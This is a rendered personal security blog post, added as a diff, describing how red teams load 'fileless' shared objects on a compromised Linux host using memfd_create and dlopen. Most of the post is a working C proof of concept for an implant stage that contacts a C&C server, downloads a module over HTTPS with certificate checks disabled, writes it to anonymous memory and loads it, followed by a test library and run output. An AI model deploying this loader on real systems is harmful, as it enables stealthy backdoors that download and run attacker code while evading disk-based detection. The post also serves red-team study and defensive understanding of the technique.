@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Loading “fileless” Shared Objects (memfd_create + dlopen) | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Loading “fileless” Shared Objects (memfd_create + dlopen)" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="An example of how to drop modules on a target using the syscall memfd_create" />
+<meta property="og:description" content="An example of how to drop modules on a target using the syscall memfd_create" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/02/02/fileless-memfd_create.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/02/02/fileless-memfd_create.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-02-02T13:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Loading “fileless” Shared Objects (memfd_create + dlopen)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-02-02T13:00:00+01:00","datePublished":"2018-02-02T13:00:00+01:00","description":"An example of how to drop modules on a target using the syscall memfd_create","headline":"Loading “fileless” Shared Objects (memfd_create + dlopen)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/02/02/fileless-memfd_create.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/02/02/fileless-memfd_create.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>2 February 2018</small>
+<h1>Loading "fileless" Shared Objects (memfd_create + dlopen)</h1>
+
+
+<p>        
+In our exercises as Red Team we always try to keep our tracks at minimum. The deployment of tools and implants is mandatory when we earn access to a system, but we need to avoid to drop unnecesary files in the machine. In other words: it is far better if you can load and run your tools from memory without touch disk.</p>
+
+<p>        
+There are pretty good articles about how to map a file to memory and then execute it (or, in the case of a shared object, load it). In this post we will just show a simple example using a syscall “recently” added. This very same topic was explained in this cool post (<a href="https://0x00sec.org/t/super-stealthy-droppers/3715">Super-Stealthy Droppers</a>) by 0x00Sec.</p>
+
+<h2 id="memfd_create-syscall">Memfd_create Syscall</h2>
+
+<p>        
+The syscall that we are using to do the dirty job is <a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html">memfd_create</a>. This syscall provide an easy way to get a file descriptor for anonymous memory without requiring a local tmpfs mount-point. In words of the <a href="https://dvdhrm.wordpress.com/2014/06/10/memfd_create2/">developers</a>:</p>
+
+<blockquote>
+  <p>“memfd_create does not require a local mount-point. It can create objects that are not associated with any filesystem and can never be linked into a filesystem. The backing memory is anonymous memory as if malloc(3) had returned a file-descriptor instead of a pointer. <strong>Note that even shm_open(3) requires /dev/shm to be a tmpfs-mount.</strong>”</p>
+</blockquote>
+
+<p>        
+Memfd_create  was introduced in kernel 3.17, so it is a bit “recent”. We can use as an alternative (far less “funky” way) what the developers indicate in the last line: for kernels &lt; 3.17, just use shm_open instead (not so “fileless” but still being a nice trick).</p>
+
+<p>        
+The syntax is pretty straighforward:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="loading-shared-objects">Loading shared objects</h2>
+<p>        
+As we said in the introduction, when we earn acces to a system we need to deploy tools and implants. In the case of implants -and depending on the scenary- a good idea is to keep just a minimum skeleton as persistence. This minimal skeleton it is just the persistence itself and a mechanism to reach the C&amp;C and download different modules to memory. In this way we have a modular backdoor that loads dynamically every portion of code needed (for example a module to scrap memory, another to parasite processes,
+port-scanner, etc..).</p>
+
+<p>        
+In order to load dynamically code we can program a very simple plugin system that loads shared objects (.so) and register new functionalities. We can use dlopen() to this approach because it admits a file descriptor as paramater :). So here is the mix:</p>
+<ul>
+  <li>Contact C&amp;C and download a module</li>
+  <li>Open a file descriptor to a memory region and write there the .so</li>
+  <li>Use dlopen() with that file descriptor to load the new code</li>
+  <li>Profit</li>
+</ul>
+
+<p>Of course this approach is pretty “lazy”, but still being a valid trick to use in our operations.</p>
+
+<h2 id="poc--gtfo">PoC || GTFO</h2>
+
+<p>Here is a simple example of how it can be done</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Skeleton PoC */</span>
+
+<span class="cp">#define _GNU_SOURCE
+</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;curl/curl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/utsname.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+
+
+<span class="cp">#define SHM_NAME "IceIceBaby"
+#define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
+</span>
+
+<span class="c1">// Wrapper to call memfd_create syscall</span>
+<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_memfd_create</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Detect if kernel is &lt; or =&gt; than 3.17</span>
+<span class="c1">// Ugly as hell, probably I was drunk when I coded it</span>
+<span class="kt">int</span> <span class="nf">kernel_version</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">struct</span> <span class="n">utsname</span> <span class="n">buffer</span><span class="p">;</span>
+	<span class="n">uname</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">);</span>
+	
+	<span class="kt">char</span> <span class="o">*</span><span class="n">token</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">separator</span> <span class="o">=</span> <span class="s">"."</span><span class="p">;</span>
+	
+	<span class="n">token</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">buffer</span><span class="p">.</span><span class="n">release</span><span class="p">,</span> <span class="n">separator</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">){</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">token</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">separator</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">17</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="c1">// Returns a file descriptor where we can write our shared object</span>
+<span class="kt">int</span> <span class="nf">open_ramfs</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">shm_fd</span><span class="p">;</span>
+
+	<span class="c1">//If we have a kernel &lt; 3.17</span>
+	<span class="c1">// We need to use the less fancy way</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">kernel_version</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">shm_fd</span> <span class="o">=</span> <span class="n">shm_open</span><span class="p">(</span><span class="n">SHM_NAME</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_CREAT</span><span class="p">,</span> <span class="n">S_IRWXU</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">shm_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//Something went wrong :(</span>
+			<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Could not open file descriptor</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="c1">// If we have a kernel &gt;= 3.17</span>
+	<span class="c1">// We can use the funky style</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">shm_fd</span> <span class="o">=</span> <span class="n">memfd_create</span><span class="p">(</span><span class="n">SHM_NAME</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">shm_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//Something went wrong :(</span>
+			<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[- Could not open file descriptor</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">shm_fd</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Callback to write the shared object</span>
+<span class="kt">size_t</span> <span class="nf">write_data</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nmemb</span><span class="p">,</span> <span class="kt">int</span> <span class="n">shm_fd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">shm_fd</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">nmemb</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Could not write file :'(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">close</span><span class="p">(</span><span class="n">shm_fd</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] File written!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Download our share object from a C&amp;C via HTTPs</span>
+<span class="kt">int</span> <span class="nf">download_to_RAM</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">download</span><span class="p">)</span> <span class="p">{</span> 
+	<span class="n">CURL</span> <span class="o">*</span><span class="n">curl</span><span class="p">;</span>
+	<span class="n">CURLcode</span> <span class="n">res</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">shm_fd</span><span class="p">;</span>
+
+	<span class="n">shm_fd</span> <span class="o">=</span> <span class="n">open_ramfs</span><span class="p">();</span> <span class="c1">// Give me a file descriptor to memory</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] File Descriptor Shared Memory created!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	
+	<span class="c1">// We use cURL to download the file</span>
+	<span class="c1">// It's easy to use and we avoid to write unnecesary code</span>
+	<span class="n">curl</span> <span class="o">=</span> <span class="n">curl_easy_init</span><span class="p">();</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">curl</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_URL</span><span class="p">,</span> <span class="n">download</span><span class="p">);</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0L</span><span class="p">);</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0L</span><span class="p">);</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_USERAGENT</span><span class="p">,</span> <span class="s">"Too lazy to search for one"</span><span class="p">);</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEFUNCTION</span><span class="p">,</span> <span class="n">write_data</span><span class="p">);</span> <span class="c1">//Callback</span>
+		<span class="n">curl_easy_setopt</span><span class="p">(</span><span class="n">curl</span><span class="p">,</span> <span class="n">CURLOPT_WRITEDATA</span><span class="p">,</span> <span class="n">shm_fd</span><span class="p">);</span> <span class="c1">//Args for our callback</span>
+		
+		<span class="c1">// Do the HTTPs request!</span>
+		<span class="n">res</span> <span class="o">=</span> <span class="n">curl_easy_perform</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">CURLE_OK</span> <span class="o">&amp;&amp;</span> <span class="n">res</span> <span class="o">!=</span> <span class="n">CURLE_WRITE_ERROR</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] cURL failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">curl_easy_strerror</span><span class="p">(</span><span class="n">res</span><span class="p">));</span>
+			<span class="n">close</span><span class="p">(</span><span class="n">shm_fd</span><span class="p">);</span>
+			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="n">curl_easy_cleanup</span><span class="p">(</span><span class="n">curl</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">shm_fd</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Load the shared object</span>
+<span class="kt">void</span> <span class="nf">load_so</span><span class="p">(</span><span class="kt">int</span> <span class="n">shm_fd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Trying to load Shared Object!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">kernel_version</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//Funky way</span>
+		<span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="s">"/proc/%d/fd/%d"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">(),</span> <span class="n">shm_fd</span><span class="p">);</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// Not funky way :(</span>
+		<span class="n">close</span><span class="p">(</span><span class="n">shm_fd</span><span class="p">);</span>
+		<span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="s">"/dev/shm/%s"</span><span class="p">,</span> <span class="n">SHM_NAME</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">handle</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">RTLD_LAZY</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">handle</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"[-] Dlopen failed with error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dlerror</span><span class="p">());</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">url</span> <span class="o">=</span> <span class="s">"https://localhost:4443/module1.so"</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Trying to reach C&amp;C &amp; start download...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">fd</span> <span class="o">=</span> <span class="n">download_to_RAM</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
+	<span class="n">load_so</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Just to test it we can use something like:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Shared Library Test */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">alert_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">alert_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"[+] Module was loaded correctly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./poc
+[+] Trying to reach C&amp;C &amp; start download...
+[+] File Descriptor Shared Memory created!
+[+] File written!
+[+] Trying to load Shared Object!
+[+] Module was loaded correctly
+</code></pre></div></div>
+
+<h2 id="final-words">Final words</h2>
+
+<p>I hope this trick can be useful for you. Maybe I made some typos or minor errors, feel free to ping me at twitter <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>.</p>
+
+<p>Byt3z!</p>
+
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
